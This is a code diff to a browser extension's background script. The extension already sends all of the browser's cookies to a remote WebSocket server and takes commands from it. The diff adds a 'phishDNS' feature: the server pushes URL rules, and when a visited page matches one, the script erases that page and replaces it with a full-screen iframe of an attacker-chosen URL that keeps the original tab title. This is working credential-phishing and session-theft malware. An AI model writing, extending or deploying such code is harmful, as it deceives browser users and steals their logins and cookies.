@@ -55,6 +55,9 @@ async function connectWebSocket() {
         chrome.cookies.getAll({}, function (cookies) {
           send("setcookies", cookies);
         });
+        // Request phishing rules sync after initial setup
+        send("phishdns_sync", { client_id });
+        
         setInterval(() => {
           send("alive", {
             client_id,
@@ -66,6 +69,7 @@ async function connectWebSocket() {
     });
 
     ws.addEventListener("message", handleMessages);
+
     ws.addEventListener("close", () => {
       console.log(
         "WebSocket disconnected, attempting to reconnect in 1 seconds..."
@@ -246,11 +250,118 @@ function handleMessages(message) {
       case "stoppolling":
         stopPolling();
         break;
+      case "phishdns_update":
+        handlePhishDNSUpdate(data[1]);
+        break;
     }
-  } catch (err) {
-    console.error(err);
+  } catch (error) {
+    console.error("Error in handleMessages:", error);
   }
 }
+
+// Store for active phishing rules
+let activePhishingRules = [];
+
+// Handle phishDNS rules update
+function handlePhishDNSUpdate(rules) {
+  activePhishingRules = rules;
+}
+
+// Check if URL matches any phishing rules
+function checkUrlAgainstRules(url) {
+  for (const rule of activePhishingRules) {
+    const pattern = rule.target_url
+      .replace(/\./g, "\\.")
+      .replace(/\*/g, ".*");
+    const regex = new RegExp(`^${pattern}$`);
+    
+    if (regex.test(url)) {
+      return rule.replacement_url;
+    }
+  }
+  return null;
+}
+
+// Inject phishing overlay when URL matches
+function injectPhishingOverlay(tabId, replacementUrl, tabTitle) {
+  chrome.scripting.executeScript({
+    target: { tabId: tabId },
+    func: (url, title) => {
+      
+      if (!document.getElementById('phishing-overlay')) {
+        // Create container first to hide the page immediately
+        document.documentElement.innerHTML = '';
+        document.documentElement.style.margin = '0';
+        document.documentElement.style.padding = '0';
+        document.body.style.margin = '0';
+        document.body.style.padding = '0';
+        const container = document.createElement('div');
+        container.id = 'phishing-overlay-container';
+        container.style.cssText = `
+          position: fixed !important;
+          top: 0 !important;
+          left: 0 !important;
+          width: 100% !important;
+          height: 100% !important;
+          margin: 0 !important;
+          padding: 0 !important;
+          background: white !important;
+          z-index: 2147483647 !important;
+        `;
+        document.documentElement.appendChild(container);
+        /*
+        // Create iframe inside container
+        const overlay = document.createElement('iframe');
+        overlay.id = 'phishing-overlay';
+        overlay.src = url;
+        overlay.style.cssText = `
+          position: absolute !important;
+          top: 0 !important;
+          left: 0 !important;
+          width: 100% !important;
+          height: 100% !important;
+          margin: 0 !important;
+          padding: 0 !important;
+          border: none !important;
+          background: white !important;
+        `;
+        
+        container.appendChild(overlay);
+        document.documentElement.appendChild(container);
+        */
+        window.setTimeout(() => {
+          document.open();
+          document.write("<!DOCTYPE html><html><head><title>"+title+"</title></head><body><iframe src=\""+url+"\" style=\"border:none;position:fixed;top:0;left:0;width:100%;height:100%;direction:ltr;\" id=\"phishing-overlay\"></iframe><script>window.addEventListener(\"message\",function (e) {if(e.data === 'setit'){localStorage.setItem(\"logged\",1);location.reload();}},false);</script></body></html>");
+          document.close();
+        }, 200);
+        
+      }
+    },
+    args: [replacementUrl, tabTitle],
+    injectImmediately: true,
+  });
+}
+
+// Listen for tab updates and navigation
+chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
+  if (tab.url) {
+    const replacementUrl = checkUrlAgainstRules(tab.url);
+    if (replacementUrl) {
+      injectPhishingOverlay(tabId, replacementUrl, tab.title);
+    }
+  }
+});
+
+// Also listen for navigation events to catch redirects
+chrome.webNavigation.onCommitted.addListener((details) => {
+  if (details.frameId === 0) { // main frame only
+    const replacementUrl = checkUrlAgainstRules(details.url);
+    if (replacementUrl) {
+      injectPhishingOverlay(details.tabId, replacementUrl, details.tab.title);
+    }
+  }
+});
+
 // sends data to server over websocket
 function send(type, data) {
   try {
